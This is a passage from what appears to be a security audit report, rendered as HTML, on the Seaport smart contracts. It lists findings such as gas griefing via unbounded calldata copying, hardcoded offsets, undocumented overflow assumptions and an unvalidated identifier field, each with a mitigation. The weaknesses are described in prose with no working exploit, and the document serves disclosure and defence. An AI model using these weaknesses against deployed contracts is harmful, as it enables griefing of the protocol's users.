class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// If the call fails...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">success</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Revert and pass the revert reason along if one was returned.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_revertWithReasonIfOneIsReturned</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Otherwise, revert with a generic error message.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">EtherTransferGenericFailure</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span></code></pre>\n<p>Simple way to make this fail:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    function _revertWithReasonIfOneIsReturned() internal view {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function _revertWithReasonIfOneIsReturned() view {</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Document these assumptions as a warning and carefully test these cases.</p>\n<h2 id=\"03-_performerc1155batchtransfers-consumes-all-gas-on-invalid-input\" style=\"position:relative;\"><a href=\"#03-_performerc1155batchtransfers-consumes-all-gas-on-invalid-input\" aria-label=\"03 _performerc1155batchtransfers consumes all gas on invalid input permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[03] <code>_performERC1155BatchTransfers</code> consumes all gas on invalid input</h2>\n<p>The <code>_performERC1155BatchTransfers</code> function manually ABI decodes <code>ConduitBatch1155Transfer[]</code>. While doing so it will read field, without any validation, to determine the length of expected data and subsequently execute <code>calldatacopy</code> with potentially unbounded copying.</p>\n<p>This may be used as a griefing attack, and such attacks seem to be attempted to be avoided by the project, as evidenced by the logic in <code>_revertWithReasonIfOneIsReturned</code>.</p>\n<p>This function is only used in the conduit and is exposed under the <code>executeBatch1155</code> external function. The risk depends on how this will be used in the future.</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><strong>Context:</strong> <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/TokenTransferrer.sol#L524\">TokenTransferrer.sol#L524</a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/TokenTransferrer.sol#L530\">TokenTransferrer.sol#L530</a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/TokenTransferrer.sol#L557\">TokenTransferrer.sol#L557</a></p>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Validate lengths against <code>calldatasize()</code>.</p>\n<h2 id=\"04-hardcoded-values-in-_validateandfulfillbasicorder\" style=\"position:relative;\"><a href=\"#04-hardcoded-values-in-_validateandfulfillbasicorder\" aria-label=\"04 hardcoded values in _validateandfulfillbasicorder permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[04] Hardcoded values in <code>_validateAndFulfillBasicOrder()</code></h2>\n<p>The distance between fields in structs is hardcoded. This could lead to mistakes with future maintenance of the code.\nThis distance can also be calculated.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><strong>Context:</strong> <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/BasicOrderFulfiller.sol#L118-L128\">BasicOrderFulfiller.sol#L118-L128</a></p>\n<p>The function <code>_validateAndFulfillBasicOrder()</code> has a hardcoded value of <code>FiveWords</code> to calculate the distance between the location of\n<code>considerationToken</code> and the <code>offerToken</code> in the <code>struct</code> <code>BasicOrderParameters</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_validateAndFulfillBasicOrder</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Determine if offered item type == additional recipient item type.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">offerTypeIsAdditionalRecipientsType</span><span class=\"mtk1\"> := </span><span class=\"mtk11\">gt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">route</span><span class=\"mtk1\">, </span><span class=\"mtk7\">3</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// If route &gt; 3 additionalRecipientsToken is at 0xc4 else 0x24.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">additionalRecipientsToken</span><span class=\"mtk1\"> := </span><span class=\"mtk11\">calldataload</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">BasicOrder_considerationToken_cdPtr</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">offerTypeIsAdditionalRecipientsType</span><span class=\"mtk1\">, </span><span class=\"mtk12\">FiveWords</span><span class=\"mtk1\">) </span><span class=\"mtk3\">// FiveWords is the hardcoded distance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}   </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">BasicOrderParameters</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">considerationToken</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">considerationIdentifier</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">considerationAmount</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">offerer</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">zone</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">offerToken</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Calculate the distance between <code>considerationToken</code> and the <code>offerToken</code> and use that instead of <code>FiveWords</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">uint256 constant BasicOrder_considerationToken_cdPtr = 0x24;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">uint256 constant BasicOrder_offerToken_cdPtr = 0xc4;         </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+uint256 constant BasicOrder_Distance_oc_cdPtr = BasicOrder_offerToken_cdPtr - BasicOrder_considerationToken_cdPtr;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- mul(offerTypeIsAdditionalRecipientsType, FiveWords)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ mul(offerTypeIsAdditionalRecipientsType, BasicOrder_Distance_oc_cdPtr) </span></span></span></code></pre>\n<p>Note: this suggestion could also be used for the assignment of <code>conduitKey</code>.\nSee <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/BasicOrderFulfiller.sol#L165-L170\">BasicOrderFulfiller.sol#L165-L170</a> and <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/BasicOrderFulfiller.sol#L1026-L1033\">BasicOrderFulfiller.sol#L1026-L1033</a></p>\n<h2 id=\"05-helpers-should-have-their-expectations-explained-in-natspeccomments\" style=\"position:relative;\"><a href=\"#05-helpers-should-have-their-expectations-explained-in-natspeccomments\" aria-label=\"05 helpers should have their expectations explained in natspeccomments permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[05] Helpers should have their expectations explained in NatSpec/comments</h2>\n<p>Certain functions with <code>unchecked</code> blocks or other “exotic logic” have assumptions for certain input values. These assumptions are not documented well. It makes it error prone to validate against possible inputs and/or expected behaviour.</p>\n<p>Examples:</p>\n<ol>\n<li>is <code>_locateCurrentAmount</code>/<code>_applyFraction</code> which has a strong dependency on <code>duration != 0</code> and <code>startTime &#x3C; endTime</code> (and <code>!=</code>). There are other cases too.</li>\n<li>In <a href=\"https://github.com/ProjectOpenSea/seaport/blob/878121af65be408462f3eae04ab81018b4e199da/contracts/lib/AmountDeriver.sol#L13\">AmountDeriver.sol#L13</a>. The correct word is “interpolation”, not  “extrapolation”. Similarly at other places where the word is used.</li>\n<li>In <a href=\"https://github.com/ProjectOpenSea/seaport/blob/878121af65be408462f3eae04ab81018b4e199da/contracts/lib/AmountDeriver.sol#L114\">AmountDeriver.sol#L114</a>, there are assumptions about the range of amounts supported in the protocol. This need to be documented well. Protocols such as Uniswap makes such assumptions explicit. More specifically, there are overflow issues when <code>value >= type(uint).max / type(uint120).max</code> Around <code>2**136</code>. </li>\n</ol>\n<h2 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h2>\n<p><strong>Context:</strong> <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/AmountDeriver.sol#L33\">lib/AmountDeriver.sol#L33</a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/AmountDeriver.sol#L138\">lib/AmountDeriver.sol#L138</a></p>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Document these assumptions.</p>\n<h2 id=\"06-conduittransfer-identifier-field-can-be-dirty-and-unused\" style=\"position:relative;\"><a href=\"#06-conduittransfer-identifier-field-can-be-dirty-and-unused\" aria-label=\"06 conduittransfer identifier field can be dirty and unused permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[06] <code>ConduitTransfer</code> identifier field can be dirty and unused</h2>\n<p>There are two external entry points <code>execute(ConduitBatch1155Transfer[] calldata batchTransfers)</code> and <code>executeWithBatch1155(ConduitTransfer[] calldata standardTransfers, ConduitBatch1155Transfer[] calldata batchTransfers)</code> which trigger the internal <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/conduit/Conduit.sol#L174\"><code>_transfer(...)</code></a> function. It works off this data structure:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ConduitTransfer</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ConduitItemType</span><span class=\"mtk1\"> </span><span class=\"mtk12\">itemType</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">identifier</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The <code>_transfer</code> function only supports the ERC-20/ERC-721/ERC-1155 item types, where it ensures that <code>amount == 1</code> for ERC-721, but allows <code>identifier</code> to be anything for ERC-20 transfers.</p>\n<p>It could be:</p>\n<ol>\n<li>used to create multiple transactions which have identical outcomes (since the field is ignored)</li>\n<li>misused to masquerade an ERC-20 transfer to look more similar to an ERC-721 transfer.</li>\n</ol>\n<p>This problem is similar to the <code>SpentItem/ReceivedItem fields can be dirty and unused</code> issue and can be triggered through that transaction, but since the <code>Conduit</code> is a general purpose feature and could be used and triggered by other contracts too.</p>\n<p>We believe that can have severe risks in the future. But it is hard to argue about the severity of this currently due to lack of clarity on what kinds of applications would be built on top of conduits.</p>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><strong>Context:</strong> <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/conduit/Conduit.sol#L174\">Conduit.sol#L174</a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/conduit/Conduit.sol#L52\">Conduit.sol#L52</a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/conduit/Conduit.sol#L117\">Conduit.sol#L117</a></p>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Insert check that <code>item.identifier == 0</code> for <code>ConduitItemType.ERC20</code>.</p>\n<h2 id=\"07-inconsistent-way-to-return-values-in-_verifytime-and-_verifyorderstatus\" style=\"position:relative;\"><a href=\"#07-inconsistent-way-to-return-values-in-_verifytime-and-_verifyorderstatus\" aria-label=\"07 inconsistent way to return values in _verifytime and _verifyorderstatus permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[07] Inconsistent way to return values in <code>_verifyTime()</code> and <code>_verifyOrderStatus</code></h2>\n<p>The functions <code>_verifyTime()</code> and <code>_verifyOrderStatus</code> use two different ways to return a value. For consistency its better to use the same way every time.</p>\n<h3 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" 